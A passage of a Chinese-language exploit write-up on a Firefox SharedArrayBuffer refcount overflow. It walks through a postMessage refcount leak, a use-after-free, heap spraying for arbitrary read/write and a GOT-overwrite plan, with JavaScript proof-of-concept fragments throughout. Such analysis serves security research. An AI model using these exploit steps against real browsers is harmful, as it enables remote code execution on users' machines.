
```cpp
nullptr,

JSMSG_SC_NOT_CLONABLE,

"SharedArrayBuffer");
        return false;
    }

    Rooted<SharedArrayBufferObject*> sharedArrayBuffer(context(),
                        &CheckedUnwrap(obj)->as<SharedArrayBufferObject>());
    SharedArrayRawBuffer* rawbuf = sharedArrayBuffer->rawBufferObject();
    // Avoids a race condition where the parent thread frees the buffer
    // before the child has accepted the transferable.
    rawbuf->addReference();
    intptr_t p = reinterpret_cast<intptr_t>(rawbuf);
    return out.writePair(SCTAG_SHARED_ARRAY_BUFFER_OBJECT,
                         static_cast<uint32_t>(sizeof(p))) &&
                         out.writeBytes(&p, sizeof(p));
}
```

`haredArrayBufferObject::Finalize(FreeOp* fop, JSObject* obj)`
`MOZ_ASSERT(fop->maybeOffMainThread());`
`SharedArrayBufferObject& buf = obj->as<SharedArrayBufferObject>();`
`// Detect the case of failure during SharedArrayBufferObject creation,`
`// which causes a SharedArrayRawBuffer to never be attached.`
`Value v = buf.getReservedSlot(RAWBUF_SLOT);`
`if (!v.isUndefined()) {`
`    // refcount_ decremented here`
`    buf.rawBufferObject()->dropReference();`
`    buf.dropRawBuffer();`
`}`
`}`

`SharedArrayRawBuffer::dropReference()`将在随后检查引用计数是否为零，如果满足条件就释放`SharedArrayRawBuffer`占用的内存。

## 2. 漏洞分析

我们发现了两处漏洞，它们单拿出来无法被利用，但组合在一起可以实现远程代码执行。

### 2.1 `refcount_`引用计数的整数溢出漏洞

上文提到的`SharedArrayRawBuffer`对象的属性`refcount_`，没有正确的进行溢出检查：

```cpp
void
SharedArrayRawBuffer::addReference()
{
   MOZ_ASSERT(this->refcount_ > 0);
   ++this->refcount_; // Atomic.
}
```

可以看到代码只是简单的增加`refcount_`的值，并没有校验是否发生溢出，当整数溢出时，`refcount_`会变为0，将触发异常。回想一下，`refcount_`被定义为一个`uint32_t`整数，这意味着上面的代码路径必须被触发`2^32`次以便溢出。这里的主要问题是每次调用`postMessage()`将创建一个`SharedArrayBufferObject`的副本，并分配`0x20`字节的内存。Firefox的堆大小的上限为4GB，上述的溢出将需要128GB，远远超过堆大小的上限，这使得这个整数溢出根本无法触发，更不可利用。

### 2.2 SCA中的引用计数泄漏

不幸的是，还有一个bug让我们得以绕过内存限制。回想以下`postMessage()`函数，它首先序列化对象，然后反序列化对象。对象的副本在反序列化过程中创建，但`refcount_`引用计数在序列化过程中增加。如果我们能使`postMessage()`在序列化`SharedArrayBufferObject`之后，在反序列化之前失败，那么就可以实现`refcount_`增加，但不创建`SharedArrayBufferObject`副本。

回顾序列化过程的处理逻辑，有一个非常简单的方法，让它在反序列化之前失败：

```cpp
bool
JSStructuredCloneWriter::startWrite(HandleValue v)
{
    if (v.isString()) {
        return writeString(SCTAG_STRING, v.toString());
    } else if (v.isInt32()) {
        return out.writePair(SCTAG_INT32, v.toInt32());
    } [...]
    } else if (v.isObject()) {
        [...]
    }
    return reportDataCloneError(JS_SCERR_UNSUPPORTED_TYPE);
}
```

如果要序列化的对象既不是基本类型也不是SCA支持的对象，则序列化将简单地抛出一个`JS_SCERR_UNSUPPORTED_TYPE`错误，并且反序列化（包括内存分配）永远不会发生！这是一个简单的PoC，它将增加`refcount_`，而不会实际复制`SharedArrayBuffer`：

```js
var w = new Worker('example.js');
// refcount_ of its SharedArrayRawBuffer is 1 here
var sab = new SharedArrayBuffer(0x100);
try {
    // serializes sab, but then: error !
    w.postMessage([sab, function() {}]);
} catch (e) {
    // ignore serialization errors :)
}
```

包含一个`SharedArrayBuffer`和一个函数的数组被序列化。SCA将首先序列化数组，然后递归序列化`SharedArrayBuffer`（从而增加其原始缓冲区的`refcount_`），最后是该函数。但是，SCA不支持函数序列化，所以抛出错误，不允许反序列化过程创建对象的副本。现在`refcount_`是2，但只有一个`SharedArrayBuffer`实际上指向原始缓冲区。利用这个引用计数泄漏的bug可以实现整数溢出，但不实际分配任何额外的内存。

## 3. 漏洞利用

虽然绕过了内存限制，触发整数溢出仍然需要`2^32`的`postMessage()`调用。在正常的PC上，这可能需要执行几个小时。为了在合理的执行时间内实现漏洞利用，我们需要找到一种方法更快地触发这个漏洞。

### 3.1 提升性能

减少对`postMessage()`函数调用的一个简单方法是每次调用序列化多个`SharedArrayBufferObject`对象：

```js
w.postMessage([sab, sab, sab, ..., sab, function() {}]);
```

不幸的是（对我们这些想做坏事的人而言），SCA支持反向引用，因此上述做法不会真正的增加`refcount_`的值，每一个`sab`会被序列化为一个指向第一个`sab`的反向引用。因此，要想使这种方法奏效，我们需要创建不同的`sab`副本，我们可以使用`postMessage()`来创建：

```js
// 以下代码在Scratchpad测试通过，可在Browser console查看输出结果
var SAB_SIZE = 0x1000000;
var sab = new SharedArrayBuffer(SAB_SIZE);
var copies = [ sab ];
window.onmessage = function (msg) {
    copies = copies.concat(msg.data);
    // copies array now contains [ sab, sab2 ]
    // where sab2 is a copy of sab
};
window.postMessage(copies, "*");
console.log(copies.toString());
```

我们声明一个包含单个`sab`的数组，使用`postMessage()`函数将它发送给当前脚本的上下文。当我们收到这个消息（也就是数组的副本），该副本将被添加到`copies`数组中。现在有两个不同的副本指向同一个`SharedArrayRawBuffer`对象了。通过以上操作反复拷贝数组，我们将获取大量有效副本。在本次漏洞利用中，我们创建了`0x10000`份副本（需要调用16次`postMessage()`函数）。然后我们使用这些副本来触发引用泄漏，此时，`postMessage()`函数需要调用的次数就降到了`2^32/0x10000 = 65536`次。我们还可以通过使用多个`Web Worker`来并行执行我们的利用代码，最大化的利用多核的处理能力，从而获得进一步的性能提升。每个`Web Worker`会接收一个长度为`0x10000`的数组缓冲区副本，然后在一个简单的循环中执行引用泄漏。

```js
for (var i = 0; i < how_many; i++) {
    try {
        postMessage([sabs, function(){}]);
    } catch (e) { }
}
```

如果`Web Worker`执行结束，那么`refcount_`应该已经溢出，且值为1。通过删除一个`sab`，`refcount_`将变为0，那么对应的`SharedRawBuffer`对象将在下一次垃圾收集期间被释放。在我们的利用代码中，一个`SharedArrayBufferObject`被垃圾回收，于是调用了`dropReference()`函数，于是引用计数递减为0，并触发对`SharedRawBuffer`对象的释放。

```js
// free one worker
delete copies[1];
// trigger majorGC,
// this will decrement `refcount_` and thus free the raw buffer
do_gc();
```

你可以在这里找到`do_gc()`的概念实现：`a61K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6j5h3g2D9L8#2)9J5c8X3k6G2P5s2m8%4L8W2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1j5`.

`code.js#L297`。

此时，`SharedArrayRawBuffer`被释放，但是对它的引用仍然存储在`sabs`中，允许对已释放的内存进行读/写，这就导致了一个UAF(use-after-free)漏洞。

### 3.2 将UAF转变为任意地址读写

由于我们还保留有对已释放内存的引用，我们可以分配大量的对象，以便将目标对象分配我们仍然持有引用的内存。需要指出一点，内存分配器将通过`mmap`系统调用申请更多的内存，`SharedArrayRawBuffer`调用`munmap`系统调用接触映射后才会返回给操作系统。我们可以使用`ArrayBuffer`对象，来实现将UAF漏洞转换为任意地址读写，因为`ArrayBuffer`对象包含指向数组内容所在内存区域的指针，如果我们在之前释放的内存区域中分配一个`ArrayBuffer`对象，则我们可以通过覆盖该指针以指向任何我们想要的内存地址。

为此，我们分配了大量大小为`0x60`的`ArrayBuffer`对象。选择`0x60`这个大小，是因为这是让`ArrayBuffer`指向的缓冲区直接排布在`ArrayBuffer`对象首部之后的最大大小。通过标记`magic`值`0x13371337`，然后查找该值第一次出现的位置，我们可以定位`ArrayBuffer`对象的确切地址。

```js
var ALLOCS = 0x100000;
buffers = []
for (i=0; i<ALLOCS; i++) {
    // store reference to the buffer
    buffers[i] = new ArrayBuffer(0x60);
    // mark the buffer with a magic value
    view = new Uint32Array(buffers[i]);
    view[0] = 0x13371337,
}
```

目前，我们应该已经将一些`ArrayBuffer`对象分配到我们先前已经释放的内存区域中。我们使用先前的引用，查找`magic`值`0x13371337`。一旦我们找到，记录它的偏移，并更新它的值为`0x13381338`。

```js
// sab is the reference to one of the SharedArrayBuffer
var sab_view = new Uint32Array(sab);
//look for first buffer that is allocated over our sab memory and mark it
for (i=0; i < SAB_SIZE/32; i++) {
    // check for the magic value
    if (sab_view[i] == 0x13371337) {
        sab_view[i] = 0x13381338;
        ptr_overwrite_idx = i;          // save the offset
        break;
    }
}
```

然后我们遍历所有的`ArrayBuffer`对象，寻找`magic`值`0x13381338`，从而定位我们刚才找到的那个`ArrayBuffer`对象。

```js
// look for the index of the marked buffer
for (i = 0; i < ALLOCS; i++) {
    view = new Uint32Array(buffers[i]);
    if (view[0] == 0x13381338) {
        // save the index of the ArrayBuffer
        ptr_access_idx = i;
        break;
    }
}
```

`buffers[ptr_access_idx]`就是受我们控制的`ArrayBuffer`对象，我们可以通过操作`sab_view[ptr_overwrite_idx]`（需要增加或减少一定的偏移）来修改它的内存空间。

上文提到，数组的内容位于数组首部之后，这意味着数组的首部从`sab_view[ptr_overwrite_idx-16]`开始。因此，可以通过写入`sab_view[ptr_overwrite_idx-8]`和`sab_view[ptr_overwrite_idx-7]`（将64位指针当作两个32位值）来覆盖指向数组缓冲区的指针。一旦指针被覆盖，就可以在`buffer[ptr_access_idx][0]`读取或写入一个32位值。

### 3.3 实现任意代码执行

实现了任意读和任意写之后，我们需要找一种方法去控制`RIP`。因为`libxul.so`(包含了大部分浏览器代码以及Spidermonkey的动态链接库)，并没有开启完全的`RELRO`保护，我们可以通过覆盖全局偏移表(`GOT`)来劫持控制流。
